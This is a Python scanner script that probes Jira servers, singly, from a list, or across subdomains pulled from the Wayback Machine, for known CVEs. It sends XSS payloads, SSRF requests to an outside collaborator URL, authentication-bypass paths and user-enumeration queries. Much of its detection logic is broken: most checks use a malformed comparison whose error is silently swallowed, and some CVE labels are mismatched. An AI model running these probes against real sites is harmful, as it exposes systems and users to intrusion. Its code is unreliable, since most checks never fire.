import argparse
import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import random

colorama.init()

def banner():
    if random.randint(0, 1) == 0:
        print(f"""
               █████ █████ ███████████     █████████   ██ ██ █████ █████   █████████  
              ░░███ ░░███ ░░███░░░░░███   ███░░░░░███ ░██░██░░███ ░░███   ███░░░░░███ 
               ░███  ░███  ░███    ░███  ░███    ░███ ░░ ░░  ░░███ ███   ░███    ░███ 
               ░███  ░███  ░██████████   ░███████████         ░░█████    ░███████████ 
               ░███  ░███  ░███░░░░░███  ░███░░░░░███          ░░███     ░███░░░░░███ 
         ███   ░███  ░███  ░███    ░███  ░███    ░███           ░███     ░███    ░███ 
        ░░████████   █████ █████   █████ █████   █████          █████    █████   █████
         ░░░░░░░░   ░░░░░ ░░░░░   ░░░░░ ░░░░░   ░░░░░          ░░░░░    ░░░░░   ░░░░░ 
                    JIRA Yet Another vulnerability Analyzer by @FR13ND0x7f
         """)
    else:    
        print(f"""

                                           -     ^ ╚▀┌ ,
                                        ▐█P     ▄    `██`
                                        ▐█  ▀ ███▀█r"  █▌
                                        ▐▌, ▀▄▐████ ═  ▐█      Y
                            ,▄▄   ¿     ██▄▄▀       ,▄▄██     , ▀,,
                       ▄▄▀▀███▄█,█      █▀████▀▀▀▀███████      █ ▀▄█████▄,
                          ▄██████`      █▄▓▌⌐█▌  ██▌═▀▄██ ,     █▄████▄  -"
                        ╔███████▌     ▐ ██       █    ███ █     ▐███████▄
                       ▄████████ ▌    ▐▌█▌       ▌     ██ █      ████████▄
                      ▀▀▀ ▄████▌█▌   ▄███⌐    ▄███     ██▐█ ▄   █⌐████▄`▀██
                         ▄████████  ▐████▌             █▌██▄█  ▐██▐████▄
                        ▄█████████▌ █████▌     ,,,,  ╚ ██████  ███▌█████▄
                       ▄█▀█████████▐██████▄          ▄███████▌▐████████▀██
                      `  ▐███████████████████▄▄▄▄▄▄████████████████████▌ `▀
                        ╒██▀██▀▀` █████████████████████████████▌ -▀▀▀▀██▄
                        ▀▀        █▀████ ▌▀█  "▀▀▀  ,███ ▐█████'
                                  ▐ ███-  ▄▄▄▄▄▄▄▄▄▄███  `███`█
                                     ██`   ▀▀▀▀▀▀▀▀▀▀▀    ███
                                     ██-    (`╓  <  "     ██
                                      ▀▀     '            ▀▀
                                            JIRA"YA    
                     JIRA Yet Another vulnerability Analyzer by @FR13ND0x7f
        """)

def JIRA_TestCases(url):
    vulnerabilities = []
    dashboard_url = f"{url}/rest/api/2/dashboard?maxResults=100"
    project_category_url = f"{url}/rest/api/2/projectCategory?maxResults=1000"
    resolution_url = f"{url}/rest/api/2/resolution"
    gadgets_url = f"{url}/rest/config/1.0/directory"
    admin_projects_url = f"{url}/rest/menu/latest/admin"
    query_component_url = f"{url}/rest//secure/QueryComponent!Default.jspa"
    user_picker_url = f"{url}/rest/api/2/user/picker?query=admin"
    JRASERVER_url = f"{url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    collaborator = "https://google.com"
    print ("+ Using collaborator as:", collaborator)
    #collaborator = f"https://victomhost:1337@example.com" #ask user for collaborator URL
    cve20198451 = f"{url}/plugins/servlet/gadgets/makeRequest?url={collaborator}" #/plugins/servlet/gadgets/makeRequest?url=
    CVE201911581 = f"{url}/secure/ContactAdministrators!default.jspa"
    CVE201820824 = f"{url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
    cve202014179 = f"{url}/secure/QueryComponent!Default.jspa"
    cve202014181 = f"{url}/ViewUserHover.jspa?username=Admin"
    cve202014181_1 = f"{url}/secure/ViewUserHover.jspa"
    cve20185230 = f"{url}/issues/"
    jupf = f"{url}/secure/ManageFilters.jspa?filter=popular&filterView=popular"
    xss = f"{url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm"
    cve20193403 = f"{url}/rest/api/2/user/picker?query=admin"
    cve20198442 = f"{url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    cve20179506 = f"{url}/plugins/servlet/oauth/users/icon-uri?consumerUri={collaborator}"
    cve20193402 = f"{url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
    cve20182082 = f"{url}/plugins/servlet/Wallboard/?dashboardId"
    cve20179506 = f"{url}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
    cve20220540 = f"{url}/InsightPluginShowGeneralConfiguration.jspa;"
    cve202205401 = f"{url}/secure/WBSGanttManageScheduleJobAction.jspa;"
    uaed = f"{url}/secure/popups/UserPickerBrowser.jspa"

    # Check for unauthenticated access to JIRA dashboards
    try:
        response = requests.get(dashboard_url)
        if response.status_code == 200:
            vulnerabilities.append(f"+ Unauthenticated access to JIRA dashboards | URL : {dashboard_url}")
    except:
        pass

    # Check for unauthenticated access to JIRA project categories
    try:
        response = requests.get(project_category_url)
        if response.status_code == 200:
            vulnerabilities.append(f"+ Unauthenticated access to JIRA project categories | URL : {project_category_url}")
    except:
        pass

    # Check for unauthenticated access to JIRA resolutions
    try:
        response = requests.get(resolution_url)
        if response.status_code == 200:
            vulnerabilities.append(f"+ Unauthenticated access to JIRA resolutions | URL : {resolution_url}")
    except:
        pass

    # Check for unauthenticated access to installed JIRA gadgets
    try:
        response = requests.get(gadgets_url)
        if response.status_code == 200:
            vulnerabilities.append(f"+ Unauthenticated access to installed JIRA gadgets | URL : {gadgets_url}")
    except:
        pass

    # Check for unauthenticated access to JIRA admin projects
    try:
        response = requests.get(admin_projects_url)
        if response.status_code == 200:
            vulnerabilities.append(f"+ Unauthenticated access to JIRA admin projects | URL : {admin_projects_url}")
    except:
        pass

    # Check for CVE-2020-14179
    try:
        response = requests.get(query_component_url)
        if response.status_code == 200 and "custom field" in response.text:
            vulnerabilities.append(f"+ CVE-2020-14179 : Information disclosure about custom fields and custom SLA | URL : {query_component_url}")
    except:
        pass

    # Check for CVE-2022-0540
    try:
        response = requests.get(cve20220540)
        if response.status_code == 200 and "General Insight Configuration" in response.text:
            vulnerabilities.append(f"+ CVE-2022-0540 : Atlassian Jira Seraph - Authentication Bypass | URL : {cve20220540}")
    except:
        pass

    # Check for CVE-2022-05401
    try:
        response = requests.get(cve202205401)
        if response.status_code == 200 and "WBS Gantt-Chart" in response.text:
            vulnerabilities.append(f"+ CVE-2022-0540 : Atlassian Jira Seraph Authentication Bypass RCE（CVE-2022-0540) | URL : {cve202205401}")
    except:
        pass

    # Check for CVE-2019-3403
    try:
        response = requests.get(user_picker_url)
        if response.status_code == 200 and "users" in response.text:
            vulnerabilities.append(f"+ CVE-2019-3403: Information disclosure of all existing users on the JIRA server | URL : {user_picker_url}")
    except:
        pass

    # Check for CVE-2019-8449 
    try:
        response = requests.get(JRASERVER_url)
        if response.status_code == 200 and "users" in response.text:
            vulnerabilities.append(f"+ CVE-2019-8449: The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability. | URL : {JRASERVER_url}")
    except:
        pass

    #cve-2019-8451:ssrf-response-body    
    try:
        response = requests.get(cve20198451)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-8451 [SSRF] : The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class. | URL : {cve20198451}")
    except:
        pass

    #RCE Jira=CVE-2019–11581
    try:
        response = requests.get(CVE201911581)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019–11581 [Potential RCE] : Need to exploit manully for now : https://hackerone.com/reports/706841 | URL : {CVE201911581}")
    except:
        pass        

    #cve-2018-20824
    try:
        response = requests.get(CVE201820824)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2018-20824 [XSS] :  vulnerable to Server Side Request Forgery (SSRF). This allowed a XSS and or a SSRF attack to be performed. More information about the Atlassian OAuth plugin issue see https://ecosystem.atlassian.net/browse/OAUTH-344 . When running in an environment like Amazon EC2, this flaw can used to access to a metadata resource that provides access credentials and other potentially confidential information. | URL : {CVE201820824}")
    except:
        pass 

    #cve-2020-14179 
    try:
        response = requests.get(cve202014179)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2020-14179 [Information Disclosure] : Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. | URL : {cve202014179}")
    except:
        pass 

    #cve-2020-14181 
    try:
        response = requests.get(cve202014181)
        if response.status_code == 200 and "admin" in response.text:
            vulnerabilities.append(f"+ CVE-2020-14181 [User Enumeration] : Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. | URL : {cve202014181}")
    except:
        pass    

    #cve-2020-14181 test case 2 
    try:
        response = requests.get(cve202014181_1)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2020-14181 [User Enumeration] : Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. | URL : {cve202014181_1}")
    except:
        pass 

    #CVE-2018-5230 = /issues/
    try:
        response = requests.get(cve20185230)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2018-5230 [Potential XSS] : https://hackerone.com/reports/380354 | URL : {cve20185230}")
    except:
        pass

    #jira-unauth-popular-filters 
    try:
        response = requests.get(jupf)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ jira-unauth-popular-filters : https://hackerone.com/reports/197726 | URL : {jupf}")
    except:
        pass

    # XSS 
    try:
        response = requests.get(xss)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ Possible XSS | URL : {xss}")
    except:
        pass       
   
    #CVE-2019-3403
    try:
        response = requests.get(cve20193403)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-3403 [Information disclosured vulnerability] : Visit the URL address,you can check the user whether is exist on this host. | URL : {cve20193403}")
    except:
        pass 

    #CVE-2019-8442
    try:
        response = requests.get(cve20198442)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-8442 [Information Disclosure] : https://jira.atlassian.com/browse/JRASERVER-69241 visit the affected url,the server will leaking some server's information | URL : {cve20198442}")
    except:
        pass 

    #CVE-2017-9506
    try:
        response = requests.get(cve20179506)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2017-9506 : https://blog.csdn.net/caiqiiqi/article/details/89017806 | URL : {cve20179506}")
    except:
        pass     

    #CVE-2019-3402
    try:
        response = requests.get(cve20193402)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-3402 [Possible XSS]：XSS in the labels gadget  | URL : {cve20193402}")
    except:
        pass  

    #CVE-2018-2082
    try:
        response = requests.get(cve20182082)
        if response.status_code == 200 in response.text:
            vulnerabilities.append("+ CVE-2018-20824 [Possible XSS]：Jira XSS in WallboardServlet through the cyclePeriod parameter append target with /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true")
    except:
        pass  

    # CVE-2017-9506
    try:
        response = requests.get(cve20179506)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ SSRF vulnerability in confluence Ref: https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a | URL : {dashboard_url}")
    except:
        pass

    # CVE-2017-9506
    try:
        response = requests.get(uaed)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ Possible username and email disclosure | URL : {uaed}")
    except:
        pass

    # Report the results of the analysis to the user
    if vulnerabilities:
        print(f"{Fore.RED}+ The following vulnerabilities were found:{Style.RESET_ALL}")
        for vulnerability in vulnerabilities:
            print("  " + vulnerability)
    else:
        print("- No vulnerabilities were found.")

def check_jira(url):
    if not url.startswith("http") or url.startswith("https"):
        url = "https://" + url
        print(f"{Fore.YELLOW}[Scanning] : " + url + f"{Style.RESET_ALL}")

    try:
        response = requests.get(url + "/rest/api/2/serverInfo")
        if response.status_code == 200 and "serverTitle" in response.json():
            print(f"{Fore.GREEN}+ JIRA is running on:", url, f"{Style.RESET_ALL}")
            JIRA_TestCases(url)            

        else:
            print("- JIRA is not running on:", url)
    except:
        print("- JIRA is not running on:", url)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Check if JIRA is running on a server or list of servers")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--single", "-s", metavar="URL", help="Check if JIRA is running on a single server")
    group.add_argument("--list", "-l", metavar="FILE", help="Check if JIRA is running on a list of servers")
    group.add_argument("--TheTimeMachine", "--thetimemachine","-ttm", metavar="URL", help="The Time Machine will do subdomain enumeration for you")
    args = parser.parse_args()

    if args.single:
        check_jira(args.single)
    elif args.TheTimeMachine:
        url = f'https://web.archive.org/cdx/search/cdx?url=*.{args.TheTimeMachine}/*&output=txt&fl=original&collapse=urlkey&page=/'
        print(f"\nTarget Loaded: "+args.TheTimeMachine)
        response = requests.get(url)
        url_list = response.text
        file = (args.TheTimeMachine+".txt")
        print("Storing in "+file)
        with open(file, "w") as f:
            f.write(url_list)

        urls = set()
        with open(file, "r") as f:
            for line in f:
                url = line.strip()
                domain = urlparse(url).netloc
                if domain not in urls:
                    urls.add(domain)
                    check_jira(domain)
    else:
        urls = set()
        with open(args.list, "r") as file:
            for line in file:
                url = line.strip()
                domain = urlparse(url).netloc
                if domain not in urls:
                    urls.add(domain)
                    check_jira(domain)

if __name__ == "__main__":
    main()
